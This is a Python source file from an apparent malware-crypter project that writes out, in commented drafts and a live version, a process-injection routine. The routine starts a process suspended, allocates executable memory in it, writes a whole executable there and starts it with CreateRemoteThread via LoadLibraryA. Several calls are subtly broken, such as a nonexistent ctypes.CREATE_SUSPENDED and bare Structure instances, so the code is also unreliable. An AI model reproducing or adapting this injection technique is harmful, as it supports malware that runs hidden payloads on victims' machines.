# import ctypes

# kernel32 = ctypes.WinDLL('kernel32')

# # Path to executable to inject
# exe_path = r'C:\Users\John Emro\Documents\GitHub\malware-crypter\MW_onmemory\calculator.exe'

# # Create the process in suspended mode
# startup_info = ctypes.create_string_buffer(68)
# process_info = ctypes.create_string_buffer(16)
# kernel32.CreateProcessA(None, exe_path, None, None, False, 4, None, None, startup_info, process_info)

# # Get the process handle and ID
# process_handle = kernel32.OpenProcess(0x1F0FFF, False, int.from_bytes(process_info))

# import ctypes
# import os
# import psutil

# class STARTUPINFO(ctypes.Structure):
#     _fields_ = [
#         ("cb", ctypes.c_ulong),
#         ("lpReserved", ctypes.c_wchar_p),
#         ("lpDesktop", ctypes.c_wchar_p),
#         ("lpTitle", ctypes.c_wchar_p),
#         ("dwX", ctypes.c_ulong),
#         ("dwY", ctypes.c_ulong),
#         ("dwXSize", ctypes.c_ulong),
#         ("dwYSize", ctypes.c_ulong),
#         ("dwXCountChars", ctypes.c_ulong),
#         ("dwYCountChars", ctypes.c_ulong),
#         ("dwFillAttribute", ctypes.c_ulong),
#         ("dwFlags", ctypes.c_ulong),
#         ("wShowWindow", ctypes.c_ulong),
#         ("cbReserved2", ctypes.c_ulong),
#         ("lpReserved2", ctypes.wintypes.LPBYTE),
#         ("hStdInput", ctypes.c_void_p),
#         ("hStdOutput", ctypes.c_void_p),
#         ("hStdError", ctypes.c_void_p),
#     ]

# startup_info = STARTUPINFO()


# # Get the path to the executable
# executable_path = r'C:\Users\John Emro\Documents\GitHub\malware-crypter\MW_onmemory\create_file.exe'

# # Get the size of the executable
# executable_size = os.path.getsize(executable_path)

# # Get a handle to kernel32.dll
# kernel32 = ctypes.WinDLL('kernel32')

# # Create a new process in suspended mode
# startup_info = ctypes.Structure()
# process_information = ctypes.Structure()
# startup_info.cb = ctypes.sizeof(startup_info)
# kernel32.CreateProcessW(
#     None,
#     executable_path,
#     None,
#     None,
#     False,
#     ctypes.CREATE_SUSPENDED,
#     None,
#     None,
#     ctypes.byref(startup_info),
#     ctypes.byref(process_information)
# )

# # Allocate memory in the new process
# process_handle = process_information.hProcess
# process_base_address = kernel32.VirtualAllocEx(
#     process_handle,
#     None,
#     executable_size,
#     ctypes.c_ulong(0x3000),
#     ctypes.c_ulong(0x40)
# )

# # Write the executable to the allocated memory
# with open(executable_path, 'rb') as f:
#     executable_data = f.read()
# kernel32.WriteProcessMemory(
#     process_handle,
#     process_base_address,
#     executable_data,
#     executable_size,
#     ctypes.byref(ctypes.c_ulong(0))
# )

# # Get the address of the entry point of the injected code
# kernel32_module = kernel32.GetModuleHandleW('kernel32.dll')
# load_library_address = kernel32.GetProcAddress(kernel32_module, 'LoadLibraryA')

# # Execute the injected code by calling the LoadLibrary function with the address of the injected code as its parameter
# thread_id = ctypes.c_ulong(0)
# kernel32.CreateRemoteThread(
#     process_handle,
#     None,
#     0,
#     load_library_address,
#     process_base_address,
#     0,
#     ctypes.byref(thread_id)
# )

# # Resume the new process
# kernel32.ResumeThread(process_information.hThread)

# # Close the process handle
# kernel32.CloseHandle(process_handle)

import ctypes
import os
import psutil

class STARTUPINFO(ctypes.Structure):
    _fields_ = [
        ("cb", ctypes.c_ulong),
        ("lpReserved", ctypes.c_wchar_p),
        ("lpDesktop", ctypes.c_wchar_p),
        ("lpTitle", ctypes.c_wchar_p),
        ("dwX", ctypes.c_ulong),
        ("dwY", ctypes.c_ulong),
        ("dwXSize", ctypes.c_ulong),
        ("dwYSize", ctypes.c_ulong),
        ("dwXCountChars", ctypes.c_ulong),
        ("dwYCountChars", ctypes.c_ulong),
        ("dwFillAttribute", ctypes.c_ulong),
        ("dwFlags", ctypes.c_ulong),
        ("wShowWindow", ctypes.c_ulong),
        ("cbReserved2", ctypes.c_ulong),
        ("lpReserved2", ctypes.c_char_p),
        ("hStdInput", ctypes.c_void_p),
        ("hStdOutput", ctypes.c_void_p),
        ("hStdError", ctypes.c_void_p),
    ]

startup_info = STARTUPINFO()


# Get the path to the executable
executable_path = r'C:\Users\John Emro\Documents\GitHub\malware-crypter\MW_onmemory\create_file.exe'

# Get the size of the executable
executable_size = os.path.getsize(executable_path)

# Get a handle to kernel32.dll
kernel32 = ctypes.WinDLL('kernel32')

# Create a new process in suspended mode
startup_info = ctypes.Structure()
process_information = ctypes.Structure()
startup_info.cb = ctypes.sizeof(startup_info)
kernel32.CreateProcessW(
    None,
    executable_path,
    None,
    None,
    False,
    ctypes.CREATE_SUSPENDED,
    None,
    None,
    ctypes.byref(startup_info),
    ctypes.byref(process_information)
)

# Allocate memory in the new process
process_handle = process_information.hProcess
process_base_address = kernel32.VirtualAllocEx(
    process_handle,
    None,
    executable_size,
    ctypes.c_ulong(0x3000),
    ctypes.c_ulong(0x40)
)

# Write the executable to the allocated memory
with open(executable_path, 'rb') as f:
    executable_data = f.read()
kernel32.WriteProcessMemory(
    process_handle,
    process_base_address,
    executable_data,
    executable_size,
    ctypes.byref(ctypes.c_ulong(0))
)

# Get the address of the entry point of the injected code
kernel32_module = kernel32.GetModuleHandleW('kernel32.dll')
load_library_address = kernel32.GetProcAddress(kernel32_module, 'LoadLibraryA')

# Execute the injected code by calling the LoadLibrary function with the address of the injected code as its parameter
thread_id = ctypes.c_ulong(0)
kernel32.CreateRemoteThread(
    process_handle,
    None,
    0,
    load_library_address,
    process_base_address,
    0,
    ctypes.byref(thread_id)
)

# Resume the new process
kernel32.ResumeThread(process_information.hThread)

# Close the process handle
kernel32.CloseHandle(process_handle)
